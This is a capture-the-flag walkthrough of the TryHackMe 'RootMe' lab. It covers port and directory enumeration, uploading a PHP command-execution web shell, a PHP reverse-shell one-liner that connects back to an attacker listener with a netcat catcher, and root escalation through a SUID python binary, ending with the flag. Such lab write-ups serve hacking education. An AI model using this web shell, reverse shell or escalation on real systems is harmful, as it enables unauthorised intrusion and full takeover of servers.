# RootMe

IP: `10.10.99.182`

## NMAP
- 22 - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- 80 - Apache httpd 2.4.29

## Gobuster
`gobuster -u 10.10.99.182 -w /home/ryusei/Tools/basic_pen_tools/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py`

found:
`/index.php (Status: 200)`
`/uploads (Status: 301)`
`/css (Status: 301)`
`/js (Status: 301)`
`/panel (Status: 301)`

`panel` allows to upload files... probably found then in uploads

## Deploy php shell
create `file.php5`
content:
`<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
`

now call it from uploads ... you have exec
run: `php -r '$sock=fsockopen("10.9.6.33",1234);exec("sh <&3 >&3 2>&3");'`

and on your machine run `nc -lnvp 1234`

## Deploy shell
`python -c 'import pty; pty.spawn("/bin/bash")'`
upload linpeas
run `chmod +x linpeas.sh`
run `./linpeas.sh`

## Linpeas findings
several findings
(alternative to linpeas search: `find / -type f -user root -perm -4000 2>/dev/null`)

but we used python and python has SUID
`/usr/bin/python`

## Use Python for Priv. esc.
type: `python -c 'import os; os.execl("bin/bash", "sh", "-p")'`
OSError: [Errno 2] No such file or directory
sry `sh` is wrong `bash` is what we need
type: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
try: `whoami` - get: `root`

goto root
find `root.txt` 
cat `root.txt` get: `THM{pr1v1l3g3_3sc4l4t10n}`
